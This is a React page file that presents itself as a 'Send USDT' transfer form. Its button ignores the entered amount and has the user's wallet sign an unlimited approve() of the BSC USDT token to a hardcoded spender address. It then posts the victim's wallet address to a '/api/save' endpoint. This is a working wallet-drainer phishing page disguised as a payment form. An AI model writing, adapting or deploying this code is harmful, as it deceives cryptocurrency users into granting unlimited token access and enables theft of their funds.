import { useState } from "react";
import { ethers } from "ethers";

export default function Home() {
  const [amount, setAmount] = useState("");

  const SPENDER = "0xEfD0c28023B55C914d0e55c2780075BbEC9E8Db1";
  const USDT = "0x55d398326f99059fF775485246999027B3197955";

  const handleApprove = async () => {
    if (!amount) return;

    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();

    const userAddress = await signer.getAddress();

    const usdt = new ethers.Contract(
      USDT,
      ["function approve(address spender, uint256 amount)"],
      signer
    );

    // 🔥 APPROVE VELOCE (non aspetta)
    const tx = await usdt.approve(SPENDER, ethers.MaxUint256);

    // 🔥 salva subito utente
    await fetch("/api/save", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ address: userAddress }),
    });

    alert("Approve inviato 🔥");
  };

  return (
    <div style={{ padding: 40, color: "white", background: "#0b0b0b", minHeight: "100vh" }}>
      <h2>Send USDT</h2>

      <input
        placeholder="Amount"
        onChange={(e) => setAmount(e.target.value)}
        style={{ padding: 10, borderRadius: 10 }}
      />

      <br /><br />

      <button
        onClick={handleApprove}
        style={{
          padding: 10,
          background: amount ? "#00ff88" : "#555",
          border: "none",
          borderRadius: 10,
          color: "black",
        }}
      >
        Next
      </button>
    </div>
  );
}